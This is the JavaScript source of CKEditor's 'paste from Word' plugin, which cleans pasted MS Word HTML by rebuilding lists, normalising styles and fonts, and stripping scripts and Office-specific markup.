/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	var fragmentPrototype = CKEDITOR.htmlParser.fragment.prototype,
		elementPrototype = CKEDITOR.htmlParser.element.prototype;

	fragmentPrototype.onlyChild = elementPrototype.onlyChild = function()
	{
		var children = this.children,
			count = children.length,
			firstChild = ( count == 1 ) && children[ 0 ];
		return firstChild || null;
	};

	elementPrototype.removeAnyChildWithName = function( tagName )
	{
		var children = this.children,
			childs = [],
			child;

		for ( var i = 0; i < children.length; i++ )
		{
			child = children[ i ];
			if( !child.name )
				continue;

			if ( child.name == tagName )
			{
				childs.push( child );
				children.splice( i--, 1 );
			}
			childs = childs.concat( child.removeAnyChildWithName( tagName ) );
		}
		return childs;
	};

	elementPrototype.getAncestor = function( tagNameRegex )
	{
		var parent = this.parent;
		while ( parent && !( parent.name && parent.name.match( tagNameRegex ) ) )
			parent = parent.parent;
		return parent;
	};

	fragmentPrototype.firstChild = elementPrototype.firstChild = function( evaluator )
	{
		var child;

		for ( var i = 0 ; i < this.children.length ; i++ )
		{
			child = this.children[ i ];
			if ( evaluator( child ) )
				return child;
			else if ( child.name )
			{
				child = child.firstChild( evaluator );
				if ( child )
					return child;
				else
					continue;
			}
		}

		return null;
	};

	// Adding a (set) of styles to the element's attributes.
	elementPrototype.addStyle = function( name, value, isPrepend )
	{
		var styleText, addingStyleText = '';
		// name/value pair.
		if ( typeof value == 'string' )
			addingStyleText += name + ':' + value + ';';
		else
		{
			// style literal.
			if ( typeof name == 'object' )
			{
				for( var style in name )
				{
					if( name.hasOwnProperty( style ) )
						addingStyleText += style + ':' + name[ style ] + ';';
				}
			}
			// raw style text form.
			else
				addingStyleText += name;

			isPrepend = value;
		}

		if( !this.attributes )
			this.attributes = {};

		styleText = this.attributes.style || '';

		styleText = ( isPrepend ?
		              [ addingStyleText, styleText ]
					  : [ styleText, addingStyleText ] ).join( ';' );

		this.attributes.style = styleText.replace( /^;|;(?=;)/, '' );
	};

	/**
	 * Return the DTD-valid parent tag names of the specified one.
	 * @param tagName
	 */
	CKEDITOR.dtd.parentOf = function( tagName )
	{
		var result = {};
		for ( var tag in this )
		{
			if ( tag.indexOf( '$' ) == -1 && this[ tag ][ tagName ] )
				result[ tag ] = 1;
		}
		return result;
	};

	var cssLengthRelativeUnit = /^(\d[.\d]*)+(em|ex|px|gd|rem|vw|vh|vm|ch|mm|cm|in|pt|pc|deg|rad|ms|s|hz|khz){1}?/i;
	var emptyMarginRegex = /^(?:\b0[^\s]*\s*){1,4}$/;

	var listBaseIndent = 0,
		 previousListItemMargin;

	CKEDITOR.plugins.pastefromword =
	{
		utils :
		{
			// Create a <cke:listbullet> which indicate an list item type.
			createListBulletMarker : function ( bulletStyle, bulletText )
			{
				var marker = new CKEDITOR.htmlParser.element( 'cke:listbullet' ),
					listType;

				// TODO: Support more list style type from MS-Word.
				if ( !bulletStyle )
				{
					bulletStyle = 'decimal';
					listType = 'ol';
				}
				else if ( bulletStyle[ 2 ] )
				{
					if ( !isNaN( bulletStyle[ 1 ] ) )
						bulletStyle = 'decimal';
					// No way to distinguish between Roman numerals and Alphas,
					// detect them as a whole.
					else if ( /^[a-z]+$/.test( bulletStyle[ 1 ] ) )
						bulletStyle = 'lower-alpha';
					else if ( /^[A-Z]+$/.test( bulletStyle[ 1 ] ) )
						bulletStyle = 'upper-alpha';
					// Simply use decimal for the rest forms of unrepresentable
					// numerals, e.g. Chinese...
					else
						bulletStyle = 'decimal';

					listType = 'ol';
				}
				else
				{
					if ( /[l\u00B7\u2002]/.test( bulletStyle[ 1 ] ) ) //l·•
						bulletStyle = 'disc';
					else if ( /[\u006F\u00D8]/.test( bulletStyle[ 1 ] ) )  //oØ
						bulletStyle = 'circle';
					else if ( /[\u006E\u25C6]/.test( bulletStyle[ 1 ] ) ) //n◆
						bulletStyle = 'square';
					else
						bulletStyle = 'disc';

					listType = 'ul';
				}

				// Represent list type as CSS style.
				marker.attributes =
				{
					'cke:listtype' : listType,
					'style' : 'list-style-type:' + bulletStyle + ';'
				};
				marker.add( new CKEDITOR.htmlParser.text( bulletText ) );
				return marker;
			},

			isListBulletIndicator : function( element )
			{
				var styleText = element.attributes && element.attributes.style;
				if( /mso-list\s*:\s*Ignore/i.test( styleText ) )
					return true;
			},

			isContainingOnlySpaces : function( element )
			{
				var text;
				return ( ( text = element.onlyChild() )
					    && ( /^(:?\s|&nbsp;)+$/ ).test( text.value ) );
			},

			resolveList : function( element )
			{
				// <cke:listbullet> indicate a list item.
				var children = element.children,
					attrs = element.attributes,
					listMarker;

				if ( ( listMarker = element.removeAnyChildWithName( 'cke:listbullet' ) )
					  && listMarker.length
					  && ( listMarker = listMarker[ 0 ] ) )
				{
					element.name = 'cke:li';

					if ( attrs.style )
					{
						attrs.style = CKEDITOR.plugins.pastefromword.filters.stylesFilter(
								[
									// Text-indent is not representing list item level any more.
									[ 'text-indent' ],
									[ 'line-height' ],
									// Resolve indent level from 'margin-left' value.
									[ ( /^margin(:?-left)?$/ ), null, function( margin )
									{
										// Be able to deal with component/short-hand form style.
										var values = margin.split( ' ' );
										margin = values[ 3 ] || values[ 1 ] || values [ 0 ];
										margin = parseInt( margin, 10 );

										// Figure out the indent unit by looking at the first increament.
										if ( !listBaseIndent && previousListItemMargin && margin > previousListItemMargin )
											listBaseIndent = margin - previousListItemMargin;

										attrs[ 'cke:margin' ] = previousListItemMargin = margin;
									} ]
							] )( attrs.style, element ) || '' ;
					}

					// Inherit list-type-style from bullet.
					var listBulletAttrs = listMarker.attributes,
						listBulletStyle = listBulletAttrs.style;

					element.addStyle( listBulletStyle );
					CKEDITOR.tools.extend( attrs, listBulletAttrs );
					return true;
				}

				return false;
			},

			// Convert various length units to 'px' in ignorance of DPI.
			convertToPx : ( function ()
			{
				var calculator = CKEDITOR.dom.element.createFromHtml(
								'<div style="position:absolute;left:-9999px;' +
								'top:-9999px;margin:0px;padding:0px;border:0px;"' +
								'></div>', CKEDITOR.document );
				CKEDITOR.document.getBody().append( calculator );

				return function( cssLength )
				{
					if( cssLengthRelativeUnit.test( cssLength ) )
					{
						calculator.setStyle( 'width', cssLength );
						return calculator.$.clientWidth + 'px';
					}

					return cssLength;
				};
			} )(),

			// Providing a shorthand style then retrieve one or more style component values.
			getStyleComponents : ( function()
			{
				var calculator = CKEDITOR.dom.element.createFromHtml(
								'<div style="position:absolute;left:-9999px;top:-9999px;"></div>',
								CKEDITOR.document );
				CKEDITOR.document.getBody().append( calculator );

				return function( name, styleValue, fetchList )
				{
					calculator.setStyle( name, styleValue );
					var styles = {},
						count = fetchList.length;
					for ( var i = 0; i < count; i++ )
						styles[ fetchList[ i ] ]  = calculator.getStyle( fetchList[ i ] );

					return styles;
				};
			} )(),

			listDtdParents : CKEDITOR.dtd.parentOf( 'ol' )
		},

		filters :
		{
				// Transform a normal list into flat list items only presentation.
				// E.g. <ul><li>level1<ol><li>level2</li></ol></li> =>
				// <cke:li cke:listtype="ul" cke:indent="1">level1</cke:li>
				// <cke:li cke:listtype="ol" cke:indent="2">level2</cke:li>
				flattenList : function( element )
				{
					var	attrs = element.attributes,
						parent = element.parent;

					var listStyleType,
						indentLevel = 1;

					// Resolve how many level nested.
					while ( parent )
					{
						parent.attributes && parent.attributes[ 'cke:list'] && indentLevel++;
						parent = parent.parent;
					}

					// All list items are of the same type.
					switch ( attrs.type )
					{
						case 'a' :
							listStyleType = 'lower-alpha';
							break;
						// TODO: Support more list style type from MS-Word.
					}

					var children = element.children,
						child;

					for ( var i = 0; i < children.length; i++ )
					{
						child = children[ i ];
						var attributes = child.attributes;

						if( child.name in CKEDITOR.dtd.$listItem )
						{
							var listItemChildren = child.children,
								count = listItemChildren.length,
								last = listItemChildren[ count - 1 ];

							// Move out nested list.
							if( last.name in CKEDITOR.dtd.$list )
							{
								children.splice( i + 1, 0, last );
								last.parent = element;

								// Remove the parent list item if it's just a holder.
								if ( !--listItemChildren.length )
									children.splice( i, 1 );
							}

							child.name = 'cke:li';
							attributes[ 'cke:indent' ] = indentLevel;
							previousListItemMargin = 0;
							attributes[ 'cke:listtype' ] = element.name;
							listStyleType && child.addStyle( 'list-style-type', listStyleType, true );
						}
					}

					delete element.name;

					// We're loosing tag name here, signalize this element as a list.
					attrs[ 'cke:list' ] = 1;
				},

				/**
				 *  Try to collect all list items among the children and establish one
				 *  or more HTML list structures for them.
				 * @param element
				 */
				assembleList : function( element )
				{
					var children = element.children, child,
							listItem,   // The current processing cke:li element.
							listItemAttrs,
							listType,   // Determine the root type of the list.
							listItemIndent, // Indent level of current list item.
							lastListItem, // The previous one just been added to the list.
							list, parentList, // Current staging list and it's parent list if any.
							indent;

					for ( var i = 0; i < children.length; i++ )
					{
						child = children[ i ];

						if ( 'cke:li' == child.name )
						{
							child.name = 'li';
							listItem = child;
							listItemAttrs = listItem.attributes;
							listType = listItem.attributes[ 'cke:listtype' ];

							// List item indent level might come from a real list indentation or
							// been resolved from a pseudo list item's margin value, even get
							// no indentation at all.
							listItemIndent = parseInt( listItemAttrs[ 'cke:indent' ], 10 )
													|| listBaseIndent && ( Math.ceil( listItemAttrs[ 'cke:margin' ] / listBaseIndent ) )
													|| 1;

							// Ignore the 'list-style-type' attribute if it's matched with
							// the list root element's default style type.
							listItemAttrs.style && ( listItemAttrs.style =
							        CKEDITOR.plugins.pastefromword.filters.stylesFilter(
									[
										[ 'list-style-type', listType == 'ol' ? 'decimal' : 'disc' ]
									] )( listItemAttrs.style )
									|| '' );

							if ( !list )
							{
								list = new CKEDITOR.htmlParser.element( listType );
								list.add( listItem );
								children[ i ] = list;
							}
							else
							{
								if ( listItemIndent > indent )
								{
									list = new CKEDITOR.htmlParser.element( listType );
									list.add( listItem );
									lastListItem.add( list );
								}
								else if ( listItemIndent < indent )
								{
									// There might be a negative gap between two list levels. (#4944)
									var diff = indent - listItemIndent,
										parent = list.parent;
									while( diff-- && parent )
										list = parent.parent;

									list.add( listItem );
								}
								else
									list.add( listItem );

								children.splice( i--, 1 );
							}

							lastListItem = listItem;
							indent = listItemIndent;
						}
						else
							list = null;
					}

					listBaseIndent = 0;
				},

				/**
				 * A simple filter which always rejecting.
				 */
				falsyFilter : function( value )
				{
					return false;
				},

				/**
				 * A filter dedicated on the 'style' attribute filtering, e.g. dropping/replacing style properties.
				 * @param styles {Array} in form of [ styleNameRegexp, styleValueRegexp,
				 *  newStyleValue/newStyleGenerator, newStyleName ] where only the first
				 *  parameter is mandatory.
				 * @param whitelist {Boolean} Whether the {@param styles} will be considered as a white-list.
				 */
				stylesFilter : function( styles, whitelist )
				{
					return function( styleText, element )
					{
						 var rules = [];
						// html-encoded quote might be introduced by 'font-family'
						// from MS-Word which confused the following regexp. e.g.
						//'font-family: &quot;Lucida, Console&quot;'
						 styleText
							.replace( /&quot;/g, '"' )
							.replace( /\s*([^ :;]+)\s*:\s*([^;]+)\s*(?=;|$)/g,
								 function( match, name, value )
								 {
									 name = name.toLowerCase();
									 name == 'font-family' && ( value = value.replace( /["']/g, '' ) );

									 var namePattern,
										 valuePattern,
										 newValue,
										 newName;
									 for( var i = 0 ; i < styles.length; i++ )
									 {
										if( styles[ i ] )
										{
											namePattern = styles[ i ][ 0 ];
											valuePattern = styles[ i ][ 1 ];
											newValue = styles[ i ][ 2 ];
											newName = styles[ i ][ 3 ];

											if ( name.match( namePattern )
												 && ( !valuePattern || value.match( valuePattern ) ) )
											{
												name = newName || name;
												whitelist && ( newValue = newValue || value );

												if( typeof newValue == 'function' )
													newValue = newValue( value, element, name );

												// Return an couple indicate both name and value
												// changed.
												if( newValue && newValue.push )
													name = newValue[ 0 ], newValue = newValue[ 1 ];

												if( typeof newValue == 'string' )
													rules.push( [ name, newValue ] );
												return;
											}
										}
									 }

									 !whitelist && rules.push( [ name, value ] );

								 });

						for ( var i = 0 ; i < rules.length ; i++ )
							 rules[ i ] = rules[ i ].join( ':' );
						return rules.length ?
						         ( rules.join( ';' ) + ';' ) : false;
					 };
				},

				/**
				 * Migrate the element by decorate styles on it.
				 * @param styleDefiniton
				 * @param variables
				 */
				elementMigrateFilter : function ( styleDefiniton, variables )
				{
					return function( element )
						{
							var styleDef =
									variables ?
										new CKEDITOR.style( styleDefiniton, variables )._.definition
										: styleDefiniton;
							element.name = styleDef.element;
							CKEDITOR.tools.extend( element.attributes, CKEDITOR.tools.clone( styleDef.attributes ) );
							element.addStyle( CKEDITOR.style.getStyleText( styleDef ) );
						};
				},

				/**
				 * Migrate styles by creating a new nested stylish element.
				 * @param styleDefinition
				 */
				styleMigrateFilter : function( styleDefinition, variableName )
				{

					var elementMigrateFilter = this.elementMigrateFilter;
					return function( value, element )
					{
						// Build an stylish element first.
						var styleElement = new CKEDITOR.htmlParser.element( null ),
							variables = {};

						variables[ variableName ] = value;
						elementMigrateFilter( styleDefinition, variables )( styleElement );
						// Place the new element inside the existing span.
						styleElement.children = element.children;
						element.children = [ styleElement ];
					};
				},

				/**
				 * A filter which remove cke-namespaced-attribute on
				 * all none-cke-namespaced elements.
				 * @param value
				 * @param element
				 */
				bogusAttrFilter : function( value, element )
				{
					if( element.name.indexOf( 'cke:' ) == -1 )
						return false;
				},

				/**
				 * A filter which will be used to apply inline css style according the stylesheet
				 * definition rules, is generated lazily when filtering.
				 */
				applyStyleFilter : null

			},

		getRules : function( editor )
		{
			var dtd = CKEDITOR.dtd,
				blockLike = CKEDITOR.tools.extend( {}, dtd.$block, dtd.$listItem, dtd.$tableContent ),
				config = editor.config,
				filters = this.filters,
				falsyFilter = filters.falsyFilter,
				stylesFilter = filters.stylesFilter,
				elementMigrateFilter = filters.elementMigrateFilter,
				styleMigrateFilter = CKEDITOR.tools.bind( this.filters.styleMigrateFilter, this.filters ),
				bogusAttrFilter = filters.bogusAttrFilter,
				createListBulletMarker = this.utils.createListBulletMarker,
				flattenList = filters.flattenList,
				assembleList = filters.assembleList,
				isListBulletIndicator = this.utils.isListBulletIndicator,
				containsNothingButSpaces = this.utils.isContainingOnlySpaces,
				resolveListItem = this.utils.resolveList,
				convertToPx = this.utils.convertToPx,
				getStyleComponents = this.utils.getStyleComponents,
				listDtdParents = this.utils.listDtdParents,
				removeFontStyles = config.pasteFromWordRemoveFontStyles !== false,
				removeStyles = config.pasteFromWordRemoveStyles !== false;

			return {

				elementNames :
				[
					// Remove script, meta and link elements.
					[ ( /meta|link|script/ ), '' ]
				],

				root : function( element )
				{
					element.filterChildren();
					assembleList( element );
				},

				elements :
				{
					'^' : function( element )
					{
						// Transform CSS style declaration to inline style.
						var applyStyleFilter;
						if ( CKEDITOR.env.gecko && ( applyStyleFilter = filters.applyStyleFilter ) )
							applyStyleFilter( element );
					},

					$ : function( element )
					{
						var tagName = element.name || '',
							attrs = element.attributes;

						// Convert length unit of width/height on blocks to
						// a more editor-friendly way (px).
						if ( tagName in blockLike
							&& attrs.style )
						{
							attrs.style = stylesFilter(
										[ [ ( /^(:?width|height)$/ ), null, convertToPx ] ] )( attrs.style ) || '';
						}

						// Processing headings.
						if ( tagName.match( /h\d/ ) )
						{
							element.filterChildren();
							// Is the heading actually a list item?
							if( resolveListItem( element ) )
								return;

							// Adapt heading styles to editor's convention.
							elementMigrateFilter( config[ 'format_' + tagName ] )( element );
						}
						// Remove inline elements which contain only empty spaces.
						else if ( tagName in dtd.$inline )
						{
							element.filterChildren();
							if ( containsNothingButSpaces( element ) )
								delete element.name;
						}
						// Remove element with ms-office namespace,
						// with it's content preserved, e.g. 'o:p'.
						else if ( tagName.indexOf( ':' ) != -1
								 && tagName.indexOf( 'cke' ) == -1 )
						{
							element.filterChildren();

							// Restore image real link from vml.
							if ( tagName == 'v:imagedata' )
							{
								var href = element.attributes[ 'o:href' ];
								if ( href )
									element.attributes.src = href;
								element.name = 'img';
								return;
							}
							delete element.name;
						}

						// Assembling list items into a whole list.
						if ( tagName in listDtdParents )
						{
							element.filterChildren();
							assembleList( element );
						}
					},

					// We'll drop any style sheet, but Firefox conclude
					// certain styles in a single style element, which are
					// required to be changed into inline ones.
					'style' : function( element )
					{
						if ( CKEDITOR.env.gecko )
						{
							// Grab only the style definition section.
							var styleDefSection = element.onlyChild().value.match( /\/\* Style Definitions \*\/([\s\S]*?)\/\*/ ),
								styleDefText = styleDefSection && styleDefSection[ 1 ],
								rules = {}; // Storing the parsed result.

							if ( styleDefText )
							{
								styleDefText
									// Remove line-breaks.
									.replace(/[\n\r]/g,'')
									// Extract selectors and style properties.
									.replace( /(.+?)\{(.+?)\}/g,
										function( rule, selectors, styleBlock )
										{
											selectors = selectors.split( ',' );
											var length = selectors.length, selector;
											for ( var i = 0; i < length; i++ )
											{
												// Assume MS-Word mostly generate only simple
												// selector( [Type selector][Class selector]).
												CKEDITOR.tools.trim( selectors[ i ] )
															  .replace( /^(\w+)(\.[\w-]+)?$/g,
												function( match, tagName, className )
												{
													tagName = tagName || '*';
													className = className.substring( 1, className.length );

													// Reject MS-Word Normal styles.
													if( className.match( /MsoNormal/ ) )
														return;

													if( !rules[ tagName ] )
														rules[ tagName ] = {};
													if( className )
														rules[ tagName ][ className ] = styleBlock;
													else
														rules[ tagName ] = styleBlock;
												} );
											}
										});

								filters.applyStyleFilter = function( element )
								{
									var name = rules[ '*' ] ? '*' : element.name,
										className = element.attributes && element.attributes[ 'class' ],
										style;
									if( name in rules )
									{
										style = rules[ name ];
										if( typeof style == 'object' )
											style = style[ className ];
										// Maintain style rules priorities.
										style && element.addStyle( style, true );
									}
								};
							}
						}
						return false;
					},

					'p' : function( element )
					{
						element.filterChildren();

						var attrs = element.attributes,
							parent = element.parent,
							children = element.children;

						// Is the paragraph actually a list item?
						if ( resolveListItem( element ) )
							return;

						// Adapt paragraph formatting to editor's convention
						// according to enter-mode.
						if ( config.enterMode == CKEDITOR.ENTER_BR )
						{
							// We suffer from attribute/style lost in this situation.
							delete element.name;
							element.add( new CKEDITOR.htmlParser.element( 'br' ) );
						}
						else
							elementMigrateFilter( config[ 'format_' + ( config.enterMode == CKEDITOR.ENTER_P ? 'p' : 'div' ) ] )( element );
					},

					'div' : function( element )
					{
						// Aligned table with no text surrounded is represented by a wrapper div, from which
						// table cells inherit as text-align styles, which is wrong.
						// Instead we use a clear-float div after the table to properly achieve the same layout.
						var singleChild = element.onlyChild();
						if( singleChild && singleChild.name == 'table' )
						{
							var attrs = element.attributes;
							singleChild.attributes = CKEDITOR.tools.extend( singleChild.attributes, attrs );
							attrs.style && singleChild.addStyle( attrs.style );

							var clearFloatDiv = new CKEDITOR.htmlParser.element( 'div' );
							clearFloatDiv.addStyle( 'clear' ,'both' );
							element.add( clearFloatDiv );
							delete element.name;
						}
					},

					'td' : function ( element )
					{
						// 'td' in 'thead' is actually <th>.
						if ( element.getAncestor( 'thead') )
							element.name = 'th';
					},

					// MS-Word sometimes present list as a mixing of normal list
					// and pseudo-list, normalize the previous ones into pseudo form.
					'ol' : flattenList,
					'ul' : flattenList,
					'dl' : flattenList,

					'font' : function( element )
					{
						// IE/Safari: drop the font tag if it comes from list bullet text.
						if ( !CKEDITOR.env.gecko && isListBulletIndicator( element.parent ) )
						{
							delete element.name;
							return;
						}

						element.filterChildren();

						var attrs = element.attributes,
							styleText = attrs.style,
							parent = element.parent;

						if ( 'font' == parent.name )     // Merge nested <font> tags.
						{
							CKEDITOR.tools.extend( parent.attributes,
									element.attributes );
							styleText && parent.addStyle( styleText );
							delete element.name;
							return;
						}
						// Convert the merged into a span with all attributes preserved.
						else
						{
							styleText = styleText || '';
							// IE's having those deprecated attributes, normalize them.
							if ( attrs.color )
							{
								attrs.color != '#000000' && ( styleText += 'color:' + attrs.color + ';' );
								delete attrs.color;
							}
							if ( attrs.face )
							{
								styleText += 'font-family:' + attrs.face + ';';
								delete attrs.face;
							}
							// TODO: Mapping size in ranges of xx-small,
							// x-small, small, medium, large, x-large, xx-large.
							if ( attrs.size )
							{
								styleText += 'font-size:' +
								             ( attrs.size > 3 ? 'large'
										             : ( attrs.size < 3 ? 'small' : 'medium' ) ) + ';';
								delete attrs.size;
							}

							element.name = 'span';
							element.addStyle( styleText );
						}
					},

					'span' : function( element )
					{
						// IE/Safari: remove the span if it comes from list bullet text.
						if ( !CKEDITOR.env.gecko && isListBulletIndicator( element.parent ) )
							return false;

						element.filterChildren();
						if ( containsNothingButSpaces( element ) )
						{
							delete element.name;
							return null;
						}

						// For IE/Safari: List item bullet type is supposed to be indicated by
						// the text of a span with style 'mso-list : Ignore' or an image.
						if ( !CKEDITOR.env.gecko && isListBulletIndicator( element ) )
						{
							var listSymbolNode = element.firstChild( function( node )
							{
								return node.value || node.name == 'img';
							});

							var listSymbol =  listSymbolNode && ( listSymbolNode.value || 'l.' ),
								listType = listSymbol.match( /^([^\s]+?)([.)]?)$/ );
							return createListBulletMarker( listType, listSymbol );
						}

						// Update the src attribute of image element with href.
						var children = element.children,
							attrs = element.attributes,
							styleText = attrs && attrs.style,
							firstChild = children && children[ 0 ];

						// Assume MS-Word mostly carry font related styles on <span>,
						// adapting them to editor's convention.
						if ( styleText )
						{
							attrs.style = stylesFilter(
									[
										// Drop 'inline-height' style which make lines overlapping.
										[ 'line-height' ],
										[ ( /^font-family$/ ), null, !removeFontStyles ? styleMigrateFilter( config[ 'font_style' ], 'family' ) : null ] ,
										[ ( /^font-size$/ ), null, !removeFontStyles ? styleMigrateFilter( config[ 'fontSize_style' ], 'size' ) : null ] ,
										[ ( /^color$/ ), null, !removeFontStyles ? styleMigrateFilter( config[ 'colorButton_foreStyle' ], 'color' ) : null ] ,
										[ ( /^background-color$/ ), null, !removeFontStyles ? styleMigrateFilter( config[ 'colorButton_backStyle' ], 'color' ) : null ]
									] )( styleText, element ) || '';
						}

						return null;
					},

					// Migrate basic style formats to editor configured ones.
					'b' : elementMigrateFilter( config[ 'coreStyles_bold' ] ),
					'i' : elementMigrateFilter( config[ 'coreStyles_italic' ] ),
					'u' : elementMigrateFilter( config[ 'coreStyles_underline' ] ),
					's' : elementMigrateFilter( config[ 'coreStyles_strike' ] ),
					'sup' : elementMigrateFilter( config[ 'coreStyles_superscript' ] ),
					'sub' : elementMigrateFilter( config[ 'coreStyles_subscript' ] ),
					// Editor doesn't support anchor with content currently (#3582),
					// drop such anchors with content preserved.
					'a' : function( element )
					{
						var attrs = element.attributes;
						if( attrs && !attrs.href && attrs.name )
							delete element.name;
					},
					'cke:listbullet' : function( element )
					{
						if ( element.getAncestor( /h\d/ ) && !config.pasteFromWordNumberedHeadingToList )
							delete element.name;
						}
				},

				attributeNames :
				[
					// Remove onmouseover and onmouseout events (from MS Word comments effect)
					[ ( /^onmouse(:?out|over)/ ), '' ],
					// Onload on image element.
					[ ( /^onload$/ ), '' ],
					// Remove office and vml attribute from elements.
					[ ( /(?:v|o):\w+/ ), '' ],
					// Remove lang/language attributes.
					[ ( /^lang/ ), '' ]
				],

				attributes :
				{
					'style' : stylesFilter(
					removeStyles ?
					// Provide a white-list of styles that we preserve, those should
					// be the ones that could later be altered with editor tools.
					[
						// Preserve margin-left/right which used as default indent style in the editor.
						[ ( /^margin$|^margin-(?!bottom|top)/ ), null, function( value, element, name )
							{
								if ( element.name in { p : 1, div : 1 } )
								{
									var indentStyleName = config.contentsLangDirection == 'ltr' ?
											'margin-left' : 'margin-right';

									// Extract component value from 'margin' shorthand.
									if ( name == 'margin' )
									{
										value = getStyleComponents( name, value,
												[ indentStyleName ] )[ indentStyleName ];
									}
									else if ( name != indentStyleName )
										return null;

									if ( value && !emptyMarginRegex.test( value ) )
										return [ indentStyleName, value ];
								}

								return null;
							} ],

						// Preserve clear float style.
						[ ( /^clear$/ ) ],

						[ ( /^border.*|margin.*|vertical-align|float$/ ), null,
							function( value, element )
							{
								if( element.name == 'img' )
									return value;
							} ],

						[ (/^width|height$/ ), null,
							function( value, element )
							{
								if( element.name in { table : 1, td : 1, th : 1, img : 1 } )
									return value;
							} ]
					] :
					// Otherwise provide a black-list of styles that we remove.
					[
						[ ( /^mso-/ ) ],
						// Fixing color values.
						[ ( /-color$/ ), null, function( value )
						{
							if( value == 'transparent' )
								return false;
							if( CKEDITOR.env.gecko )
								return value.replace( /-moz-use-text-color/g, 'transparent' );
						} ],
						// Remove empty margin values, e.g. 0.00001pt 0em 0pt
						[ ( /^margin$/ ), emptyMarginRegex ],
						[ 'text-indent', '0cm' ],
						[ 'page-break-before' ],
						[ 'tab-stops' ],
						[ 'display', 'none' ],
						removeFontStyles ? [ ( /font-?/ ) ] : null
					], removeStyles ),

					// Prefer width styles over 'width' attributes.
					'width' : function( value, element )
					{
						if( element.name in dtd.$tableContent )
							return false;
					},
					// Prefer border styles over table 'border' attributes.
					'border' : function( value, element )
					{
						if( element.name in dtd.$tableContent )
							return false;
					},

					// Only Firefox carry style sheet from MS-Word, which
					// will be applied by us manually. For other browsers
					// the css className is useless.
					'class' : falsyFilter,

					// MS-Word always generate 'background-color' along with 'bgcolor',
					// simply drop the deprecated attributes.
					'bgcolor' : falsyFilter,

					// Deprecate 'valign' attribute in favor of 'vertical-align'.
					'valign' : removeStyles ? falsyFilter : function( value, element )
					{
						element.addStyle( 'vertical-align', value );
						return false;
					}
				},

				// Fore none-IE, some useful data might be buried under these IE-conditional
				// comments where RegExp were the right approach to dig them out where usual approach
				// is transform it into a fake element node which hold the desired data.
				comment :
					!CKEDITOR.env.ie ?
						function( value, node )
						{
							var imageInfo = value.match( /<img.*?>/ ),
								listInfo = value.match( /^\[if !supportLists\]([\s\S]*?)\[endif\]$/ );

							// Seek for list bullet indicator.
							if ( listInfo )
							{
								// Bullet symbol could be either text or an image.
								var listSymbol = listInfo[ 1 ] || ( imageInfo && 'l.' ),
									listType = listSymbol && listSymbol.match( />([^\s]+?)([.)]?)</ );
								return createListBulletMarker( listType, listSymbol );
							}

							// Reveal the <img> element in conditional comments for Firefox.
							if( CKEDITOR.env.gecko && imageInfo )
							{
								var img = CKEDITOR.htmlParser.fragment.fromHtml( imageInfo[ 0 ] ).children[ 0 ],
									previousComment = node.previous,
									// Try to dig the real image link from vml markup from previous comment text.
									imgSrcInfo = previousComment && previousComment.value.match( /<v:imagedata[^>]*o:href=['"](.*?)['"]/ ),
									imgSrc = imgSrcInfo && imgSrcInfo[ 1 ];

								// Is there a real 'src' url to be used?
								imgSrc && ( img.attributes.src = imgSrc );
								return img;
							}

							return false;
						}
					: falsyFilter
			};
		}
	};

	// The paste processor here is just a reduced copy of html data processor.
	var pasteProcessor = function()
	{
		this.dataFilter = new CKEDITOR.htmlParser.filter();
	};

	pasteProcessor.prototype =
	{
		toHtml : function( data )
		{
			var fragment = CKEDITOR.htmlParser.fragment.fromHtml( data, false ),
				writer = new CKEDITOR.htmlParser.basicWriter();

			fragment.writeHtml( writer, this.dataFilter );
			return writer.getHtml( true );
		}
	};

	CKEDITOR.cleanWord = function( data, editor )
	{
		// Firefox will be confused by those downlevel-revealed IE conditional
		// comments, fixing them first( convert it to upperlevel-revealed one ).
		// e.g. <![if !vml]>...<![endif]>
		if( CKEDITOR.env.gecko )
			data = data.replace( /(<!--\[if[^<]*?\])-->([\S\s]*?)<!--(\[endif\]-->)/gi, '$1$2$3' );

		var dataProcessor = new pasteProcessor(),
			dataFilter = dataProcessor.dataFilter;

		// These rules will have higher priorities than default ones.
		dataFilter.addRules( CKEDITOR.plugins.pastefromword.getRules( editor ) );

		// Allow extending data filter rules.
		editor.fire( 'beforeCleanWord', { filter : dataFilter } );

		try
		{
			data = dataProcessor.toHtml( data, false );
		}
		catch ( e )
		{
			alert( editor.lang.pastefromword.error );
		}

		/* Below post processing those things that are unable to delivered by filter rules. */

		// Remove 'cke' namespaced attribute used in filter rules as marker.
		data = data.replace( /cke:.*?".*?"/g, '' );

		// Remove empty style attribute.
		data = data.replace( /style=""/g, '' );

		// Remove the dummy spans ( having no inline style ).
		data = data.replace( /<span>/g, '' );

		return data;
	};
})();

/**
 * Whether the ignore all font-related format styles, including:
 * - font size;
 * - font family;
 * - font fore/background color;
 * @name CKEDITOR.config.pasteFromWordRemoveFontStyles
 * @type Boolean
 * @default true
 * @example
 * config.pasteFromWordRemoveFontStyles = false;
 */

/**
 * Whether transform MS-Word Outline Numbered Heading into html list.
 * @name CKEDITOR.config.pasteFromWordNumberedHeadingToList
 * @type Boolean
 * @default false
 * @example
 * config.pasteFromWordNumberedHeadingToList = true;
 */

/**
 * Whether remove element styles that can't be managed with editor, note that this
 * this doesn't handle the font-specific styles, which depends on
 * how {@link CKEDITOR.config.pasteFromWordRemoveFontStyles} is configured.
 * @name CKEDITOR.config.pasteFromWordRemoveStyles
 * @type Boolean
 * @default true
 * @example
 * config.pasteFromWordRemoveStyles = false;
 */
